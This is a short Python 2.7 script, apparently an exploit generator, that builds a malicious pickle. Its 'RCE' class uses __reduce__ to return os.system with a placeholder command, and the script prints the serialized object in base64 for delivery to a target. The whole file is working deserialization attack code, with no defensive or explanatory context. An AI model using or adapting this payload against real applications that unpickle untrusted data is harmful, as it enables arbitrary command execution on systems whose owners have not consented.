import cPickle
import os
import base64

#Python2.7
class RCE(object):
    def __reduce__(self):
        command = "command to execute" #Command to execute
        return os.system, (command,)

if __name__ == '__main__':
    a = RCE()
    pickled = cPickle.dumps(a)
    print(base64.urlsafe_b64encode(pickled))


